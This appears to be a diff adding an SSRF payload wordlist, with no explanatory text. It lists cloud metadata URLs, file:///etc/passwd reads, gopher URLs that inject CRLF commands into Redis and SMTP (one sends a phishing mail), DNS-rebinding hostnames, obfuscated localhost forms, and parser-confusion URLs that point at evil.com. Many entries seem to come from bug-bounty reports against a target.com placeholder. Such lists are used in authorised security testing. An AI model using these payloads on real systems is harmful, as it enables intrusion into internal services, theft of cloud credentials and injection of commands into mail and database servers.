@@ -1,0 +1,120 @@
+./build-poc/src/curl -u 'testuser:Password1' smb://127.0.0.1:4455/share/file.txt
+./ssrf_pasvaggresvftp.sh -t 127.0.0.1/31 -p 80,8000-8100 -x ./ftp_curl.sh -vv
+//127.0.0.1
+10.0.0.0/8
+127.0.0.1
+127.0.0.1:2222
+127.0.0.1:6379
+169.254.169.254
+2130706433
+<iframe src='http://localhost:9222 width=900 height=900></iframe>
+<iframe src='http://localhost:9222/json width=900 height=900></iframe>
+A.1.1.1.1.1time.127.0.0.1.forever.rebind.network
+Referer: http://localhost:3000/
+[::1]
+curl "gopher://localhost:7070/1/legitimate%0d%0ainjected%0d%0amalicious"
+curl -L http://169.254.169.254/metadata/v1/
+curl -XPUT --data "10" http://localhost:8001/debug/flags/v
+curl -v "gopher://localhost:7070/1/first-command%0d%0asecond-command"
+curl -vv 'f[h-j]le:///etc/passwd' will  parse 3 request , like  curl -vv 'fhle:///etc/passwd' 、curl -vv 'file:///etc/passwd' 、curl -vv 'fjle:///etc/passwd'
+curl http://localhost:8001/logs/target.com
+file://
+file:///
+file:///home/user/#.js
+gopher://example.com/1/selector%0d%0aINJECTED_COMMAND
+gopher://internal-redis:6379/1/SET%20key%20value%0d%0aGET%20sensitive_data
+gopher://mail-server:25/1/MAIL%20FROM:<attacker@evil.com>%0d%0aRCPT%20TO:<victim@target.com>%0d%0aDATA%0d%0aSubject:%20Phishing
+http:///169.254.169.254/latest/meta-data/
+http://127.0.0.1
+http://127.0.0.1/
+http://127.0.0.1/test.png
+http://127.0.0.1:18091/
+http://127.0.0.1:21/?%0A
+http://127.0.0.1:22/?%0A
+http://127.0.0.1:6379/
+http://127.0.0.1:80/haha.txt
+http://127.0.0.1:8080
+http://127.0.0.1:8080**
+http://127.0.0.1:8091/
+http://127.0.0.1:8092/
+http://127.0.0.1:9090
+http://127.0.0.1:9090/api/v1/targets.
+http://127.0.0.1:9200/haha.txt
+http://127.0.0.1:9998/
+http://169.254.169.254
+http://169.254.169.254/
+http://169.254.169.254/latest/meta-data
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/a
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/meta-data
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1.json&type=embed
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254\/@geonode.target.com
+http://169.254.169.254\@geonode.target.com
+http://192.168.1.148/index.php/test.png
+http://192.168.1.157/info.php/test.html
+http://192.168.100.14
+http://192.168.100.9:8080
+http://192.168.100.9:8080,
+http://192.168.100.9:8080.
+http://[0:0:0:0:0:ffff:127.0.0.1
+http://localhost
+http://localhost/
+http://localhost/,
+http://localhost:25
+http://localhost:9090/api/v1/targets
+http://localhost:9222
+http://metadata.google.internal
+http://metadata.google.internal/
+http://target.com
+http://target.com.
+http://target.com//127.0.0.1
+http://target.com/http://127.0.0.1
+http://target.com:22
+https://127.0.0.1/
+https://127.0.0.1/else/internal
+https://127.0.0.1:1
+https://127.0.0.1:18091/
+https://127.0.0.1:21
+https://127.0.0.1:22
+https://127.0.0.1:80
+https://1:@10.0.0.1:\@@@@w.evil.com/@https://target.com/
+https://1:@127.0.0.1:\@@@@w.evil.com/@https://target.com/
+https://localhost
+https://localhost/
+https://localhost:22
+https://target.com/?ip=localhost;
+https://target.com/api/web_resource/url?q=http://[0:0:0:0:0:ffff:127.0.0.1
+https://target.com/body
+https://target.com/button
+https://target.com/div
+https://target.com/evil.com/icon.png
+https://target.com/import.css
+https://target.com/input
+https://target.com/input8
+https://target.com/input9
+https://target.com/inputa
+https://target.com/inputb
+https://target.com/inputcode{}_{}
+https://target.com/input{}{}
+https://target.com/iu/?u=http://127.0.0.1:6868%2fstatus%2f?q=http://evil.com/
+https://target.com/iur/?f=1&image_host=http://169.254.169.254/latest/meta-data/
+https://target.com/iur/?f=1&image_host=https://127.0.0.1:18091/
+https://target.com/iur/?f=1&image_host=https://127.0.0.1:18091/ui/
+https://target.com/localhost/icon.png
+https://target.com/record-data?name=path&data=
+https://target.com/static/js/new.js
+https://target.com/vidgif/url?url=ftp://evil.com:12345/TEST
+https://target.com/webhook5
+https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/
+localhost
+localhost:6725
+make-1.1.1.1-rebindfor15s-127.0.0.1-rr.1u.ms
+target.com
+{"data":{"url":"https://127.0.0.1:80"}}
+{"imapHost":"127.0.0.1","imapPort":<port_number>,"imapSslMode":"none","imapUser":"xxx@xxx.org","imapPassword":"xxx","smtpSslMode":"none","smtpUser":"xxx@xxx.org","smtpPassword":"xxx","accountName":"xxx@xxx.org","emailAddress":"xxx@xxx.org"}
+{"imapHost":"target.com","imapPort":993,"imapSslMode":"ssl","imapUser":"redacted","imapPassword":"redacter","smtpHost":"127.0.0.1","smtpPort":8080,"smtpSslMode":"none","smtpUser":"xx","smtpPassword":"xx","accountName":"Test1","emailAddress":"xxx@xxx.org"}
